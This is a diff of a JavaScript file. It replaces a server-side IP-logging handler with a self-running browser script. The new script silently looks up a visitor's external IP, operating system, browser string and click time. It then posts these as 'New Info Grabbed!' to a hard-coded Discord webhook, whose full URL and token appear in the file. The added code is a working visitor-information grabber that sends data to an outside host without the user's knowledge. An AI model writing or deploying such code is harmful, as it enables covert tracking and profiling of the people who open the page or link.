@@ -1,101 +1,61 @@
-const fetch = require('node-fetch');
-const fs = require('fs');
-const path = require('path');
-
-// Simple IP validation (optional)
-const isValidIP = (ip) => {
-    const regex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){2}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
-    return regex.test(ip);
-};
-
-// Path to the log file
-const logFilePath = path.join(__dirname, 'ip_log.json');
-
-// Function to read and append the IP to the JSON file
-const logIPToFile = (ip) => {
-    return new Promise((resolve, reject) => {
-        // Check if the log file exists
-        fs.readFile(logFilePath, 'utf8', (err, data) => {
-            let logData = [];
-            if (err && err.code === 'ENOENT') {
-                // If the file doesn't exist, initialize with an empty array
-                logData = [];
-            } else if (err) {
-                return reject('Error reading the log file');
-            } else {
-                try {
-                    // Parse the existing log file content
-                    logData = JSON.parse(data);
-                } catch (e) {
-                    return reject('Error parsing the log file content');
-                }
-            }
-
-            // Add the new IP address with the current timestamp
-            logData.push({ ip, timestamp: new Date().toISOString() });
-
-            // Write the updated log data back to the file
-            fs.writeFile(logFilePath, JSON.stringify(logData, null, 2), 'utf8', (err) => {
-                if (err) {
-                    return reject('Error writing to the log file');
-                }
-                resolve();
-            });
-        });
-    });
-};
-
-exports.handler = async (event) => {
-    if (event.httpMethod !== 'POST') {
-        return {
-            statusCode: 405,
-            body: 'Method Not Allowed',
-        };
-    }
+(async () => {
+    // Replace with your webhook URL
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1306923540418924595/bs9LVhT5wNKgAdqXmOzWgiVriiQebWHCXCRimxfz4ZTY7MLsUgL5o81RJelQWapDZ2JG';
 
     try {
-        const { ip } = JSON.parse(event.body);
-        
-        // Validate IP format
-        if (!ip || !isValidIP(ip)) {
-            return {
-                statusCode: 400,
-                body: 'Invalid IP address provided',
-            };
-        }
+        // Get external IP address using an API
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ip = ipData.ip;
 
-        // Log the IP locally to the JSON file
-        await logIPToFile(ip);
+        // Get system information
+        const os = navigator.platform; // Operating system
+        const browser = navigator.userAgent; // Browser information
+        const timeClick = new Date().toISOString(); // Click time
 
-        // Discord webhook URL
-        const webhookUrl = 'https://discordapp.com/api/webhooks/1306923540418924595/bs9LVhT5wNKgAdqXmOzWgiVriiQebWHCXCRimxfz4ZTY7MLsUgL5o81RJelQWapDZ2JG';
-
-        // Message to be sent to Discord
+        // Prepare data to send to the webhook
         const message = {
-            content: `Ny IP-adresse logget: ${ip}`,
+            content: "New Info Grabbed!",
+            embeds: [
+                {
+                    title: "User Information",
+                    fields: [
+                        {
+                            name: "IP Address",
+                            value: ip,
+                            inline: true,
+                        },
+                        {
+                            name: "Operating System",
+                            value: os,
+                            inline: true,
+                        },
+                        {
+                            name: "Browser",
+                            value: browser,
+                            inline: false,
+                        },
+                        {
+                            name: "Time of Click",
+                            value: timeClick,
+                            inline: false,
+                        },
+                    ],
+                },
+            ],
         };
 
-        // Send the request to Discord
-        const response = await fetch(webhookUrl, {
+        // Send the data to the webhook using fetch
+        await fetch(webhookUrl, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json',
+            },
             body: JSON.stringify(message),
         });
 
-        // Check if the response from Discord was successful
-        if (!response.ok) {
-            throw new Error(`Failed to send message to Discord: ${response.statusText}`);
-        }
-
-        return {
-            statusCode: 200,
-            body: 'IP logged locally and sent to Discord',
-        };
-    } catch (err) {
-        console.error('Error:', err);
-        return {
-            statusCode: 500,
-            body: 'Internal Server Error',
-        };
+        console.log('Info successfully sent to the webhook!');
+    } catch (error) {
+        console.error('Error grabbing info:', error);
     }
-};
+})();
